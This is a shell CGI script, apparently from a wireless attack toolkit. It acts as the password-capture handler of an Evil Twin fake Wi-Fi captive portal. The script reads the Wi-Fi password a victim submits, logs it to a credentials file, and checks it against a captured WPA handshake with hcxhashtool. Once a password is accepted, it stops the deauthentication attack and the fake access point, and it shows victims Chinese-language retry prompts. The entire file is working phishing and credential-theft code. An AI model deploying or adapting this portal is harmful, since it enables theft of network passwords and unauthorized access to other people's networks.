#!/bin/sh
# Evil Twin captive portal POST handler (BusyBox httpd CGI).
# Reads url-encoded body from stdin (CONTENT_LENGTH bytes).

ET_DIR="/tmp/arx-et"
CREDS_FILE="$ET_DIR/creds.txt"
PMKID_FILE="$ET_DIR/handshake.22000"
DEAUTH_PID="$ET_DIR/deauth.pid"

len="${CONTENT_LENGTH:-0}"
case "$len" in *[!0-9]*) len=0 ;; esac
if [ "$len" -lt 1 ] || [ "$len" -gt 4096 ]; then
	printf 'Content-Type: application/json\r\n\r\n'
	printf '{"ok":false,"msg":"请求无效"}'
	exit 0
fi

POST_DATA=$(dd ibs=1 obs=1 count="$len" 2>/dev/null) || POST_DATA=""

password=""
if [ -x /usr/bin/lua ]; then
	password=$(printf '%s' "$POST_DATA" | /usr/bin/lua -e '
local s = io.read("*a")
local p = s:match("password=([^&]*)") or ""
p = p:gsub("+", " "):gsub("%%(%x%x)", function(h)
  return string.char(tonumber(h, 16))
end)
io.write(p)
')
else
	password=$(printf '%s' "$POST_DATA" | sed -n 's/^.*password=\([^&]*\).*$/\1/p' | tr '+' ' ')
fi

password=$(printf '%s' "$password" | tr -d '\r\n')

pwlen=$(printf '%s' "$password" | wc -c)
if [ "$pwlen" -lt 8 ] || [ "$pwlen" -gt 63 ]; then
	printf 'Content-Type: application/json\r\n\r\n'
	printf '{"ok":false,"msg":"密码长度无效"}'
	exit 0
fi

ts=$(date '+%Y-%m-%d %H:%M:%S')

printf 'Content-Type: application/json\r\n\r\n'

_et_has_hash() {
	[ -f "$PMKID_FILE" ] && [ -s "$PMKID_FILE" ] && command -v hcxhashtool >/dev/null 2>&1
}

_kill_deauth() {
	dp=$(cat "$DEAUTH_PID" 2>/dev/null)
	[ -n "$dp" ] && kill "$dp" 2>/dev/null
}

# Full Evil Twin teardown shortly after response (deauth + fake AP + dns + httpd).
_schedule_full_stop() {
	(sleep 2; /bin/sh /usr/bin/arx-et.sh stop >> "$ET_DIR/et.log" 2>&1) &
}

# Pick hash lines for target BSSID when possible (.22000 can list multiple APs).
_hcx_input_file() {
	local tmpf="$ET_DIR/.submit22000"
	rm -f "$tmpf"
	local bs_raw
	bs_raw=$(cat "$ET_DIR/target_bssid.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' | tr -d ':')
	if [ -n "$bs_raw" ]; then
		grep -Fi "$bs_raw" "$PMKID_FILE" > "$tmpf" 2>/dev/null || true
	fi
	if [ -s "$tmpf" ]; then
		echo "$tmpf"
	else
		rm -f "$tmpf"
		echo "$PMKID_FILE"
	fi
}

_psk_verify_ok() {
	local hsin ec
	hsin=$(_hcx_input_file)
	printf '%s' "$password" > "$ET_DIR/.psk_try"
	hcxhashtool -i "$hsin" --psk="$(cat "$ET_DIR/.psk_try")" >/dev/null 2>&1
	ec=$?
	rm -f "$ET_DIR/.psk_try" "$ET_DIR/.submit22000"
	[ "$ec" -eq 0 ]
}

if _et_has_hash; then
	if _psk_verify_ok; then
		echo "$ts | $password | verified" >> "$CREDS_FILE"
		echo "verified" > "$ET_DIR/submit_state.txt"
		logger -t arx-et "Evil Twin: password verified against handshake (hcxhashtool)"
		_kill_deauth
		printf '{"ok":true,"verified":true}'
		_schedule_full_stop
	else
		echo "$ts | $password | rejected" >> "$CREDS_FILE"
		printf '{"ok":false,"msg":"密码错误，请重试"}'
	fi
	exit 0
fi

# No handshake file: record and accept after 2nd submission (not cryptographically verified)
echo "$ts | $password | pending" >> "$CREDS_FILE"
count=$(wc -l < "$CREDS_FILE" 2>/dev/null || echo 0)
if [ "$count" -ge 2 ]; then
	echo "unverified_ok" > "$ET_DIR/submit_state.txt"
	logger -t arx-et "Evil Twin: accepted after retry (no handshake file — not cryptographically verified)"
	_kill_deauth
	printf '{"ok":true,"verified":false}'
	_schedule_full_stop
else
	printf '{"ok":false,"msg":"演示模式（无握手文件）：请再次提交同一密码以确认，并非表示密码错误"}'
fi
